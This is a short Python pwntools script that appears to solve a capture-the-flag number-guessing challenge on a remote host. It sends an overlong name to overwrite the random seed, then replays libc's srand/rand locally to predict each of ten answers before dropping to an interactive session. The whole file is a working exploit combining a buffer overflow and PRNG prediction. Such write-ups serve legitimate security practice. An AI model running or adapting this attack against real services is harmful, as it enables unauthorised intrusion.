#!usr/bin/python
#coding=utf-8
from pwn import *
from ctypes import *

io = remote('39.96.88.40', 7040)
# io = process('./game')
libc = cdll.LoadLibrary("/lib/x86_64-linux-gnu/libc.so.6")
payload = "a" * 36 + p64(1)
io.recvuntil('Your name is :')
io.sendline(payload)
libc.srand(1)
# io.interactive()
for i in range(0,10):
    rand = libc.rand()
    libc.srand(rand)
    num = str(libc.rand()%100+1)
    io.recvuntil("Guess Number:")
    io.sendline(num)

io.interactive()
